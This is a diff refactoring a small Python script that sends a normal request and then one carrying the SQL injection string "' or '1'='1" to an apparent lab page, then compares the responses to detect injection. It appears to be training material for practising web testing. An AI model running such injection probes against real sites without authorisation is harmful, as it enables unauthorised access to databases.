@@ -5,18 +5,18 @@ import difflib
 # specify URL to connect to
 base_url = "http://vulnerable/sqli/example1.php?{}"
 
-args = {"name":"root"}
-
+# build a genuine request and store the response
+value = "root"
+args = {"name" : value}
 url = base_url.format(urllib.parse.urlencode(args))
-
 
 with urllib.request.urlopen(url) as u:
 	gen_content = list(u.read().decode("utf-8").split('\n'))
 
 
-name = "root"
+# build a fuzzy request and store the response
 fuzz_string = "\' or \'1\'=\'1"
-args["name"] = name + fuzz_string
+args["name"] = value + fuzz_string
 url = base_url.format(urllib.parse.urlencode(args))
 
 with urllib.request.urlopen(url) as u:
@@ -24,10 +24,6 @@ with urllib.request.urlopen(url) as u:
 
 # compare the responses
 diff_list = difflib.context_diff(gen_content, fuzz_content)
-
-diff = ""
-for e in diff_list:
-	diff += e
-
-print(diff)
+diff = "".join([line for line in diff_list])
+print(diff) if diff!="" else print("No change")
 
